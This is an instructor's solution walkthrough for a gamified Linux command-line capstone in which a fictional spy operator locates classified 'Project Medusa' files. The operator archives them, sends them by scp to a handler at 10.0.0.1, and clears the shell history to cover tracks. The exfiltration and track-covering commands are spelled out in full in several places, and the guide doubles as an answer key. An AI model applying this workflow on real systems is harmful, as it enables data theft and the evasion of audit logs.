# SOLUTION: CLH-030 - OPERATION CHIMERA

**Module:** CLH-030 (Capstone - 30+ minute challenge)
**Tier:** CLI Ghost
**XP Reward:** 500 XP + "CLI Ghost" rank
**Prerequisites:** CLH-029
**User:** ghost | **Hostname:** CHIMERA | **Start Dir:** /home/ghost

---

## Mission Overview

You are operator "ghost", replacing the previous operator WRAITH-7 who was extracted after accessing the wrong project (Hydra instead of Medusa). Your mission: locate PROJECT MEDUSA data, extract the verification code, package the classified data, exfiltrate to handler SPECTER-1 at 10.0.0.1, and cover your tracks.

**Verification Code:** `MEDUSA-9`
**Decoy Codes (DO NOT USE):** HYDRA-3, CERBERUS-1, PHOENIX-7

---

## Filesystem Map

```
/home/ghost/
├── .bash_history          # WRAITH-7's previous session (clues about mistakes)
├── .bashrc                # Shell config, mentions .chimera_ops
├── .profile               # Hints to check hidden dirs
├── .chimera_ops/          # Hidden operational data
│   ├── operator_notes.txt # Critical intel from WRAITH-7 (target = MEDUSA)
│   └── abort_procedures.txt # Emergency abort codes
├── .ssh/                  # SSH keys and config
│   ├── id_ed25519         # Private key
│   ├── id_ed25519.pub     # Public key
│   ├── known_hosts        # Network hosts (10.0.0.1 = handler)
│   ├── authorized_keys    # Authorized operators
│   └── config             # SSH shortcuts (handler, internal)
├── mission/               # Operational parameters
│   ├── briefing.txt       # Full mission briefing (6 objectives)
│   ├── intel_brief.txt    # TARGET ID: MEDUSA, verification code MEDUSA-9
│   ├── contacts.txt       # Handler: SPECTER-1 @ 10.0.0.1
│   ├── rules_of_engagement.txt  # ROE - 6 rules
│   └── target_profile.txt # Chimera Holdings org profile
├── tools/                 # Operational scripts
│   ├── scanner.sh         # Quick environment scan
│   ├── exfil.sh           # Exfiltration helper
│   ├── cleanup.sh         # Post-op cleanup
│   └── verify.sh          # Package verification
├── staging/               # Exfil staging area
│   └── README.txt         # Workflow: package → verify → transfer → cleanup
├── recon/                 # Previous reconnaissance
│   ├── network_map.txt    # Network IPs (handler @ 10.0.0.1)
│   ├── user_enum.txt      # System users (ghost, admin, analyst, etc.)
│   └── service_list.txt   # Running services (SSH:22, HTTP:80, MySQL:3306...)
└── notes/                 # WRAITH-7's intel
    ├── warning.txt        # Don't access Hydra or Cerberus
    ├── wraith7_debrief.txt # Full debrief of WRAITH-7's mistakes
    └── filesystem_map.txt # Directory tree of /data

/data/
├── projects/
│   ├── README.txt         # "All access is logged and monitored"
│   ├── hydra/             # DECOY - MONITORED (WRAITH-7 triggered alert)
│   │   ├── summary.txt    # "UNDER ENHANCED MONITORING"
│   │   ├── specs.txt      # "[CLASSIFIED]"
│   │   └── verification.txt # HYDRA-3 (DECOY CODE)
│   ├── cerberus/          # HONEYPOT - instant compromise
│   │   ├── README.txt     # Perimeter defense
│   │   └── secrets.txt    # "HONEYPOT TRIGGERED" trap
│   └── medusa/            # ★ THE ACTUAL TARGET ★
│       ├── overview.txt   # SIGINT platform, $75M budget
│       ├── personnel.txt  # 23 cleared personnel
│       ├── timeline.txt   # Contains MEDUSA-9 verification code
│       └── classified/    # ★ EXFIL TARGET DIRECTORY ★
│           ├── project_medusa.pdf       # Executive summary (MEDUSA-9 inside)
│           ├── architecture.docx        # System architecture
│           ├── sigint_protocols.xlsx    # Collection protocols
│           ├── verification_codes.txt   # All codes listed (MEDUSA-9 is valid)
│           └── team_roster.txt          # Personnel roster
├── archive/               # Red herring
│   ├── old_projects.txt   # Phoenix, Sphinx, Griffin (old)
│   └── deprecated_codes.txt # PHOENIX-7, SPHINX-2, GRIFFIN-4 (deprecated)
├── public/                # Safe to read
│   ├── company_info.txt   # Chimera Holdings company info
│   └── org_chart.txt      # Organization structure
└── backups/               # No access (backup user owns)
    ├── db_backup.sql.gz
    └── files_backup.tar.gz

/etc/passwd               # User enumeration
/etc/group                # Group memberships (classified, projects)
/etc/shadow               # Permission denied

/var/log/
├── auth.log              # SSH logins (WRAITH-7 on Jan 15, you on Jan 17)
├── syslog                # System events
├── secure                # Auth success
├── access.log            # HTTP-style access log (WRAITH-7 triggered alert)
└── chimera_audit.log     # Security audit (HYDRA-3 decoy submitted, monitoring enabled)
```

---

## Complete Walkthrough - All 18 Phases

### PHASE 1: RECONNAISSANCE (Objectives 1-4)

#### Objective 1: RECON - Establish your identity
**Task:** "Establish your identity"
**Hint:** "Who are you on this system?"
**Validation:** Command includes `whoami`, output includes `ghost`

```bash
ghost@CHIMERA:~$ whoami
ghost
```

---

#### Objective 2: RECON - Survey your environment
**Task:** "Survey your environment"
**Hint:** "What files and directories are in your home? Including hidden ones?"
**Validation:** Command includes `ls` with `-a` flag, output includes `.chimera_ops`

```bash
ghost@CHIMERA:~$ ls -la
drwxr-xr-x  ghost ghost  mission
drwxr-xr-x  ghost ghost  tools
drwx------  ghost ghost  staging
drwxr-xr-x  ghost ghost  recon
drwxr-xr-x  ghost ghost  notes
-rw-r--r--  ghost ghost  .bashrc
-rw-------  ghost ghost  .bash_history
drwx------  ghost ghost  .ssh
-rw-r--r--  ghost ghost  .profile
drwx------  ghost ghost  .chimera_ops
```

**Key insight:** The `.chimera_ops` hidden directory is critical - it contains intel from the previous operator.

---

#### Objective 3: RECON - Discover previous operator intel
**Task:** "Discover previous operator intel"
**Hint:** "Hidden directories often contain critical operational data. What did the previous operator leave behind?"
**Validation:** Output includes `WRAITH-7` AND (`MEDUSA` or `Medusa`)

```bash
ghost@CHIMERA:~$ cat .chimera_ops/operator_notes.txt
```

This file reveals:
- Previous operator was WRAITH-7 (extracted, mission incomplete)
- Real target is PROJECT MEDUSA (not Hydra, not Cerberus)
- Handler SPECTER-1 at 10.0.0.1
- HYDRA-3 is a DECOY code
- WRAITH-7 accessed the wrong directory and triggered an alert

---

#### Objective 4: RECON - Read your mission briefing
**Task:** "Read your mission briefing"
**Hint:** "The mission/ directory contains your operational parameters. What is your target?"
**Validation:** Output includes `TOP SECRET` AND `CHIMERA` AND `MEDUSA`

```bash
ghost@CHIMERA:~$ cat mission/briefing.txt
```

This confirms:
- Classification: TOP SECRET // NOFORN // CHIMERA
- 6 mission objectives (recon, identify target, get code, package, exfil, cleanup)
- Target is PROJECT MEDUSA
- Handler: SPECTER-1 @ 10.0.0.1
- Exfil window: 0300-0500 UTC

---

### PHASE 2: ENUMERATION (Objectives 5-7)

#### Objective 5: ENUM - Identify system users
**Task:** "Identify system users"
**Hint:** "Who has accounts on this system? Which file lists all users?"
**Validation:** Output includes `ghost`, `admin`, `analyst`, `/bin/bash`

```bash
ghost@CHIMERA:~$ cat /etc/passwd
```

Users with shell access: root, ghost (you), admin (IT admin, has sudo), analyst
Service accounts: svc_chimera, backup (no shell)

---

#### Objective 6: ENUM - Check group memberships
**Task:** "Check group memberships"
**Hint:** "What groups exist? Who has access to classified data?"
**Validation:** Output includes `classified` AND `projects`

```bash
ghost@CHIMERA:~$ cat /etc/group
```

Key groups:
- `projects:x:1000:ghost,analyst,admin` - all three have project access
- `classified:x:1001:admin,ghost` - only admin and ghost have classified access
- `sudo:x:27:admin` - only admin has sudo

---

#### Objective 7: ENUM - Map the network
**Task:** "Map the network"
**Hint:** "Where is the handler? Check your SSH configuration or known hosts."
**Validation:** Output includes `10.0.0.1` AND (`handler` OR `SPECTER`)

```bash
ghost@CHIMERA:~$ cat .ssh/config
```

Or alternatively:
```bash
ghost@CHIMERA:~$ cat recon/network_map.txt
```

Key network info:
- 10.0.0.1 = Handler (SPECTER-1) - YOUR EXFIL POINT
- 10.0.0.42 = Internal database server
- 10.0.0.50 = This workstation (CHIMERA)
- 10.0.0.100 = Primary file server

---

### PHASE 3: LOG ANALYSIS (Objectives 8-9)

#### Objective 8: LOGS - Review authentication history
**Task:** "Review authentication history"
**Hint:** "What happened on January 15th? Check the auth logs for WRAITH-7's session."
**Validation:** Output includes `ghost`, `hydra`, AND (`ALERT` OR `Jan 15`)

```bash
ghost@CHIMERA:~$ cat /var/log/auth.log
```

Shows:
- Jan 15 02:30 - ghost (WRAITH-7) logged in from 10.0.0.1
- Jan 15 02:40 - ghost accessed /data/projects/hydra/ → **ALERT triggered**
- Jan 15 02:55 - session closed (emergency extraction)
- Jan 17 03:00 - ghost (YOU) logged in from 10.0.0.1

---

#### Objective 9: LOGS - Understand the security incident
**Task:** "Understand the security incident"
**Hint:** "The audit log shows what went wrong. What directory triggered the alert?"
**Validation:** Output includes `HYDRA-3` AND `DECOY`

```bash
ghost@CHIMERA:~$ cat /var/log/chimera_audit.log
```

Reveals the full incident:
- WRAITH-7 accessed /data/projects/hydra/ (monitored directory)
- Enhanced monitoring was enabled
- Verification code HYDRA-3 was submitted → **DECOY CODE**
- Security review initiated
- After extraction: Hydra placed under enhanced monitoring, Cerberus honeypot refreshed

---

### PHASE 4: TARGET IDENTIFICATION (Objectives 10-12)

#### Objective 10: TARGET - Explore the data directory structure
**Task:** "Explore the data directory structure"
**Hint:** "What projects exist in /data/projects? List them WITHOUT accessing individual directories yet."
**Validation:** Command includes `ls` AND `/data`, output includes `medusa`, `hydra`, `cerberus`

```bash
ghost@CHIMERA:~$ ls /data/projects
```

Shows: hydra, cerberus, medusa, README.txt

**Critical:** Only list - do NOT cd into hydra or cerberus.

---

#### Objective 11: TARGET - Identify the correct verification code
**Task:** "Identify the correct verification code"
**Hint:** "The intel_brief.txt contains critical information. What is the VALID mission verification code (not a decoy)?"
**Validation:** Output includes `MEDUSA-9` AND `ONLY valid`

```bash
ghost@CHIMERA:~$ cat mission/intel_brief.txt
```

Confirms:
- Target: PROJECT MEDUSA in /data/projects/medusa/
- The ONLY valid mission verification code is: **MEDUSA-9**
- HYDRA-3, CERBERUS-1, PHOENIX-7 are all decoys
- Target files: /data/projects/medusa/classified/

---

#### Objective 12: TARGET - Access the Medusa classified directory
**Task:** "Access the Medusa classified directory"
**Hint:** "Navigate to the target: /data/projects/medusa/classified/ - What files are there?"
**Validation:** Command includes `ls`, `medusa`, `classified`, output includes `project_medusa.pdf`

```bash
ghost@CHIMERA:~$ ls /data/projects/medusa/classified
```

Contents:
- project_medusa.pdf (5MB - executive summary)
- architecture.docx (2MB)
- sigint_protocols.xlsx (1MB)
- verification_codes.txt
- team_roster.txt

---

### PHASE 5: DATA EXTRACTION (Objectives 13-14)

#### Objective 13: EXTRACT - Read the classified Medusa document
**Task:** "Read the classified Medusa document"
**Hint:** "The PDF contains the mission verification. Confirm the code matches what you found in intel_brief.txt."
**Validation:** Output includes `MEDUSA-9`, `TOP SECRET`, `MEDUSA`

```bash
ghost@CHIMERA:~$ cat /data/projects/medusa/classified/project_medusa.pdf
```

Confirms:
- Classification: TOP SECRET
- Project Medusa: next-gen signals intelligence platform
- Mission Verification Code: **MEDUSA-9** (matches intel_brief.txt)
- Budget: $75M across FY2025-2027

---

#### Objective 14: EXTRACT - Verify target data location
**Task:** "Verify target data location"
**Hint:** "Confirm /data/projects/medusa/classified/ is your exfil target. Check staging/README.txt for the workflow."
**Validation:** Command includes `cat` AND `staging`, output includes `handler`

```bash
ghost@CHIMERA:~$ cat staging/README.txt
```

Workflow confirmed:
1. Package: `tar -czf staging/intel.tar.gz /data/projects/medusa/classified/`
2. Verify: `ls -la staging/`
3. Transfer: `scp staging/intel.tar.gz handler@10.0.0.1:/dropbox/`
4. Cleanup: `rm staging/intel.tar.gz && history -c`

Handler: SPECTER-1 @ 10.0.0.1

---

### PHASE 6: EXFILTRATION (Objectives 15-18)

#### Objective 15: EXFIL - Package the intelligence
**Task:** "Package the intelligence"
**Hint:** "Create a compressed archive of /data/projects/medusa/classified/ in your staging directory."
**Validation:** Command includes `tar`, `-c`, `medusa`, `classified`

```bash
ghost@CHIMERA:~$ tar -czf staging/medusa_intel.tar.gz /data/projects/medusa/classified/
```

Or use the provided tool:
```bash
ghost@CHIMERA:~$ ./tools/exfil.sh /data/projects/medusa/classified/
```

---

#### Objective 16: EXFIL - Verify your package
**Task:** "Verify your package"
**Hint:** "Confirm the package exists in staging/ before transfer."
**Validation:** Command includes `ls` AND `staging`, output includes `.tar` or `.gz`

```bash
ghost@CHIMERA:~$ ls staging/
```

Should show: `medusa_intel.tar.gz` (or `intel.tar.gz`)

---

#### Objective 17: EXFIL - Transfer to handler
**Task:** "Transfer to handler"
**Hint:** "Send the package to the handler at 10.0.0.1. Use SCP."
**Validation:** Command includes `scp` AND (`10.0.0.1` OR `handler`), output includes `100%`

```bash
ghost@CHIMERA:~$ scp staging/medusa_intel.tar.gz handler@10.0.0.1:/dropbox/
```

Expected output: simulated transfer progress ending with `100%`

---

#### Objective 18: CLEANUP - Cover your tracks
**Task:** "Cover your tracks"
**Hint:** "Delete the package and clear your command history. Leave no trace."
**Validation:** (Command includes `rm` AND `staging`) OR (command includes `history` AND `-c`)

```bash
ghost@CHIMERA:~$ rm staging/medusa_intel.tar.gz
ghost@CHIMERA:~$ history -c
```

Or use the provided tool:
```bash
ghost@CHIMERA:~$ ./tools/cleanup.sh
```

**Note:** Only ONE of these actions is needed to pass the objective (rm staging OR history -c).

---

### INSIGHT PHASE (Final Verification)

After all 18 objectives, a verification prompt appears:

**Question:** "What is the VALID mission verification code? (Hint: It's NOT Hydra or Phoenix)"

**Answer:** `MEDUSA-9`

Accepted variants: `MEDUSA-9`, `medusa-9`, `MEDUSA9`, `medusa9`

**Wrong answer message:** "Incorrect. Remember: HYDRA-3 and PHOENIX-7 are DECOY codes. The target is Medusa."
**Hint (after 2 failed attempts):** "The valid code is in mission/intel_brief.txt and confirmed in /data/projects/medusa/classified/"

---

## Decoy/Trap Summary

| Code | Project | Type | Risk |
|------|---------|------|------|
| **MEDUSA-9** | Medusa | **VALID** | None - this is the answer |
| HYDRA-3 | Hydra | DECOY | Directory is monitored, code triggers security review |
| CERBERUS-1 | Cerberus | HONEYPOT | Instant compromise, access logged |
| PHOENIX-7 | Archive | DEPRECATED | Old project, no longer valid |
| SPHINX-2 | Archive | DEPRECATED | Cancelled project |
| GRIFFIN-4 | Archive | DEPRECATED | Merged into Hydra |

---

## Optimal Path (Speedrun)

For experienced operators who know the layout:

```bash
whoami                                              # Obj 1
ls -la                                              # Obj 2
cat .chimera_ops/operator_notes.txt                 # Obj 3
cat mission/briefing.txt                            # Obj 4
cat /etc/passwd                                     # Obj 5
cat /etc/group                                      # Obj 6
cat .ssh/config                                     # Obj 7
cat /var/log/auth.log                               # Obj 8
cat /var/log/chimera_audit.log                      # Obj 9
ls /data/projects                                   # Obj 10
cat mission/intel_brief.txt                         # Obj 11
ls /data/projects/medusa/classified                 # Obj 12
cat /data/projects/medusa/classified/project_medusa.pdf  # Obj 13
cat staging/README.txt                              # Obj 14
tar -czf staging/medusa_intel.tar.gz /data/projects/medusa/classified/  # Obj 15
ls staging/                                         # Obj 16
scp staging/medusa_intel.tar.gz handler@10.0.0.1:/dropbox/  # Obj 17
rm staging/medusa_intel.tar.gz && history -c        # Obj 18
# Insight: MEDUSA-9
```

**Minimum commands:** 18 (one per objective) + insight answer = 19 total inputs

---

## Teaching Points

1. **OPSEC:** Read intel before acting. WRAITH-7 failed by rushing in without reading the briefing.
2. **Enumeration:** Always enumerate users, groups, network, and logs before touching targets.
3. **Log Analysis:** Auth logs and audit logs reveal what happened before you arrived.
4. **Decoys & Honeypots:** Real targets are surrounded by traps. Verify before accessing.
5. **Exfiltration Workflow:** Package → Verify → Transfer → Cleanup. Never skip steps.
6. **Track Covering:** Clear history, remove artifacts, leave no trace.

---

*Solution generated for instructor reference. Not for student distribution.*
